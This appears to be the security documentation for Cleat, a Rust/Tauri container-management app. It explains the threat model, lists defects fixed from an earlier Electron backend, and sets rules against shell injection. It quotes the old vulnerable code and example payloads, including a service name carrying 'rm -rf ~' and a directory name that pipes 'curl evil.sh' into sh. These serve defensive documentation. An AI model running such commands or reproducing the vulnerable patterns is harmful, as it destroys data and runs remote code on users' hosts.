# Security

## Threat model

A container-management GUI is a privileged tool. Access to the Docker socket is
**root-equivalent on the host** — anyone who can reach it can start a container
that bind-mounts `/` and read or write anything. So the two questions that matter
are:

1. **Who can reach the daemon through us?** Only the local user, through the app
   window. There is no network surface.
2. **Can user-supplied text become a command?** No. Every subprocess is argv, and
   the two fields that reach a subprocess are validated first.

Everything below follows from those two.

## Defects fixed in the port

These were present in the discontinued Electron implementation (`backend/app.js`
in the [previous repository](https://github.com/rajeshpillai/docker-desktop-lite)) and are the reason the rewrite was
worth doing. They are documented here so they are not reintroduced.

### 1. Root-equivalent Docker control exposed to the network

```js
app.use(cors());                                    // any origin
app.listen(3000);                                   // all interfaces
```

An Express server bound to `0.0.0.0:3000` with permissive CORS, in front of a
full `dockerode` client. Anything on the LAN — or any web page the user visited,
via CORS — could list, start, stop, and delete containers, and create new ones
with arbitrary mounts.

**Now:** there is no HTTP server. Commands are Tauri IPC between the WebView and
the Rust process in the same application. No port is bound, no origin is
accepted, and there is nothing to misconfigure.

### 2. Command injection via service name

```js
exec(`docker exec ${containerId} systemctl start ${serviceName}`, ...)
```

`serviceName` came straight from the URL path. A request for
`/containers/abc/services/nginx;%20rm%20-rf%20~/start` executed `rm -rf ~` as the
user running the backend.

**Now:** [`engine.rs::exec_capture()`](../tauri-rs/src-tauri/src/runtime/engine.rs)
uses bollard's `create_exec` with an **argv vector**. There is no shell in the
path at all, so metacharacters are inert. On top of that:

- the action is whitelisted (`start` | `stop` | `restart` | `status`)
- the unit name must match `[A-Za-z0-9.\-_@:\\]{1,128}` and may not begin with
  `-` (which would otherwise be parsed as a flag)

`rejects_shell_metacharacters_in_service_names` asserts eight payloads are
rejected — `;`, `&&`, `|`, `$(…)`, backticks, newline, `>`, and a leading `-`.

### 3. Command injection via compose project directory

```js
const composeFilePath = path.resolve(projectDir, 'docker-compose.yml');
exec(`docker-compose -f ${composeFilePath} up -d`, { cwd: projectDir }, ...)
```

`projectDir` came from the request body. `path.resolve` normalises a path; it does
not escape shell metacharacters. A directory named `/tmp/x; curl evil.sh | sh`
executed.

**Now:** [`compose.rs`](../tauri-rs/src-tauri/src/runtime/compose.rs) builds argv
and passes it to `tokio::process::Command`, never a shell string. The path is
canonicalised and confirmed to be a directory — or a file, whose directory is
then used — before it becomes the working directory, so a bad path fails cleanly
instead of running the command somewhere unexpected. A named file reaches compose
as a `-f` argument in that same argv, not as text in a command line.

### 4. A route that could never work

`GET /containers/:id/services` called `fetchContainerServices()`, which was never
defined anywhere in the codebase. The route always threw and returned 500.

**Now:** implemented via `systemctl list-units --type=service --no-pager --plain
--no-legend`, parsed by `parse_systemctl_units()`, with unit tests covering the
normal output, the bullet-prefixed degraded-unit form, and non-service noise.

### 5. Every error was a 500

`res.status(500)` regardless of what the daemon said, so the UI could not
distinguish "no such container" from "daemon unreachable" from "network still in
use".

**Now:** typed error kinds — see [architecture.md](architecture.md#error-mapping).

## Rules for contributors

These are the invariants that keep the above fixed.

**Never build a shell string.** Use argv:

```rust
// NO
Command::new("sh").arg("-c").arg(format!("docker exec {id} systemctl start {svc}"))

// YES
Command::new(program).args(leading).args(args).current_dir(dir)
// or, better, no subprocess at all:
docker.create_exec(id, CreateExecOptions { cmd: Some(argv), .. })
```

**Compose and credential helpers are the only subprocesses.** Neither has an
API. Compose is a CLI tool; a credential helper *is* a protocol over a process —
`docker-credential-<name> get`, registry on stdin, JSON on stdout — and there is
no way to read a secret out of the OS keychain without running the binary that
owns it. Everything else goes through the Engine API. If you find yourself
reaching for `Command` elsewhere, check whether bollard already exposes it.

The helper name comes out of the user's own config file and reaches
`Command::new`, so it is validated as a plain identifier
(`[A-Za-z0-9_-]+`) before it is spawned — a `credsStore` of `../../evil` must not
become a path. `refuses_a_helper_name_that_is_not_an_identifier` pins six
payloads. The registry goes on **stdin**, never argv, so it cannot become a flag.

**Validate anything that reaches argv.** Even without a shell, an unvalidated
value can become a *flag*. `--force` as a "service name" is not a shell injection
but is still a command the user didn't ask for. Hence the leading-`-` rejection in
`validate_service_name()`.

**Whitelist verbs, don't blacklist characters.** The action parameter is matched
against a fixed set. Adding a new one is a deliberate edit.

**The interactive terminal is a deliberate exception, and it is not a
regression.** [`exec_start()`](../tauri-rs/src-tauri/src/runtime/engine.rs) takes
an unconstrained argv, which looks like it contradicts the rule above. It does
not, and the distinction is worth being explicit about:

- The service-control path takes a value that names *one* thing (a systemd unit)
  and would otherwise be interpolated into a command the user never asked for.
  Constraining it removes capability the feature never needed.
- The terminal's whole purpose is to run a command of the user's choosing. There
  is no smaller capability that still delivers the feature.

What keeps it sound is that the mechanism is unchanged: `create_exec` receives an
**argv vector**, never a shell string, so there is no metacharacter parsing to
subvert — if the user types `;` it reaches the shell *inside the container*,
which is exactly what a terminal is for. The trust boundary is the container, and
the user already holds root-equivalent daemon control through this app; a
terminal grants nothing they could not obtain via `create_container`.

Empty and whitespace-only argv are still rejected (`rejects_empty_exec`), because
those are bugs rather than intentions.

Two consequences worth knowing:

- **Terminal traffic is base64 over IPC**, not text. This is a correctness
  measure, not a security one — a `String` would force a lossy UTF-8 decode that
  corrupts escape sequences and multi-byte characters split across chunks.
- **Closing a terminal aborts the connection**, which is how the Docker CLI
  behaves too. A process that ignores its terminal closing can survive as an
  orphan inside the container until it exits or the container stops.

**Canonicalise paths before use.** `resolve_project_dir()` calls `canonicalize()`
and checks `is_dir()`.

**Don't widen the capability set casually.**
[`capabilities/default.json`](../tauri-rs/src-tauri/capabilities/default.json)
grants `core:default`, `opener:default`, and `dialog:allow-open` — the last only
so the compose view can open a directory picker. The CSP in
[`tauri.conf.json`](../tauri-rs/src-tauri/tauri.conf.json) restricts the WebView
to `'self'` plus the IPC origin; there is no remote content and no reason for
there to be.

## Showing what Cleat actually does

The **Activity** view records every operation, with arguments, timing and
outcome. It exists because of the first item under *What is not claimed* below:
Cleat has root-equivalent access to the daemon, and a document asserting it
makes only the calls it says it does is weaker than showing them.

Three design points worth keeping:

- **It records Engine API requests, not `docker` commands.** Cleat speaks the
  API; there is no CLI invocation behind `start_container` to reveal. Printing
  `docker start abc` would be showing a *translation* while implying it was a
  *recording* — and the moment the two diverge, the panel is confidently wrong.
  Compose is the exception and shows the literal argv, because compose is the
  one remaining subprocess.
- **The request lines are captured, not authored.**
  [`runtime/wire.rs`](../tauri-rs/src-tauri/src/runtime/wire.rs) hooks
  `bollard`'s request modifier, which runs inside `build_request` — the funnel
  every endpoint goes through, including the connection upgrade behind exec —
  and appends the real method, path and query to a task-local slot that
  `AuditRuntime::record` opens around each operation. The first version of this
  panel typed the method and path next to each call instead. It was already
  wrong: it advertised `GET /images/json` while bollard was sending
  `GET /images/json?all=false&shared-size=false&digests=false&manifests=false`.
  A description of a request is a thing that can disagree with the request.
  Because an operation can issue more than one, the field is a list and shows
  every one — which immediately caught a second error: `exec_start` advertised
  two requests and actually makes three, the third being the terminal resize
  that can only happen once the process exists.
  `audit_records_every_exec_request` pins all three, because exec is both the
  most privileged operation in the app and the one whose capture depends on
  bollard internals (`process_upgraded`) that a version bump could move. Both
  audit tests live in `common::suite` and run against Docker *and* Podman: the
  hook is installed per client, so only running both proves neither backend was
  left unhooked.
- **The recorder is a decorator on `ContainerRuntime`**
  ([`runtime/audit.rs`](../tauri-rs/src-tauri/src/runtime/audit.rs)), wrapped on
  in `AppState::select_runtime` — the only place a runtime is constructed.
  Logging per command handler would drift the first time someone adds a command
  and forgets the logging line, and a log that silently under-reports is worse
  than none.

Two paths do not go through `bollard` and each has to announce itself: the
lenient fallback in [`runtime/raw.rs`](../tauri-rs/src-tauri/src/runtime/raw.rs)
calls `wire::record` directly, and compose passes its argv to `record_argv`.
Compose still runs under capture, so a compose path that reached the API would
surface rather than fall between the two mechanisms.

Environment values whose keys look secret (`password`, `token`, `secret`,
`*_key`, …) are masked before they reach the log, since the whole point is that
people paste this into bug reports. `masks_secret_looking_env_values` and
`leaves_ordinary_env_alone` pin both directions.

The buffer holds the most recent 500 entries in memory and is never written to
disk.

## What is *not* claimed

- **We do not sandbox the daemon.** If your user can reach the Docker socket, so
  can this app, by design. It is a management tool.
- **Container images are not scanned.** Vulnerability scanning (Trivy/Grype) is
  on the roadmap, not implemented.
- **Registry credentials are read, never stored.** Cleat has no credential store
  of its own. It resolves what `docker login` / `podman login` already wrote —
  `~/.docker/config.json`, Podman's `auth.json`, or whichever helper owns the
  secret — and hands it to the daemon for the length of one pull or push. There
  is no second copy to leak or to go stale. Cleat cannot log you in or out; use
  the CLI for that.
- **Push is not separately privileged.** It resolves credentials through the
  same path as a pull and is refused by the registry when there is no login, so
  Cleat cannot publish anywhere the CLI on the same machine could not. Push has
  no automated test for the same reason: verifying it would mean publishing to
  a real registry under someone's account.
- **Credentials never reach the activity log.** They travel in the
  `X-Registry-Auth` header, and the capture hook in `wire.rs` reads only method
  and path. `secrets_in_headers_are_not_recorded` asserts a request carrying
  both `X-Registry-Auth` and `Authorization` records neither.
- **Listing logins does not unlock anything.** The registries panel and the pull
  dialog report which registry owns a credential without invoking its helper, so
  neither can make the OS prompt for a keychain password. The cost is that a
  helper-backed registry shows no username — Cleat knows the credential is there
  without having read it.
- **Kubernetes credentials are read, never stored** — the same rule as registry
  logins. `kube` reads the kubeconfig `kubectl` already uses. That includes
  `exec` credential plugins, which are subprocesses this app then runs: a
  kubeconfig is executable configuration, so a hostile one is a hostile program.
  Cleat inherits `kubectl`'s trust model here and does not attempt to sandbox
  it — if you would not run `kubectl` against that kubeconfig, do not point
  Cleat at it either.
- **Applying a manifest is unbounded by design**, so it is gated rather than
  restricted: every apply runs a server-side dry-run first, and the Apply
  control stays disabled until that returns clean. Cleat holds no cluster
  permission of its own — everything is done as the context's user, so it can
  never do more than `kubectl` could from the same machine.
- **Generated manifests carry secrets in plain text.** A Deployment without its
  environment does not run, so generation keeps the values and warns instead of
  redacting. The warning names the offending keys; moving them to a Secret is
  the reader's call.
- **No formal audit** has been performed. The claims above describe specific
  defects fixed and specific tests that pin them.
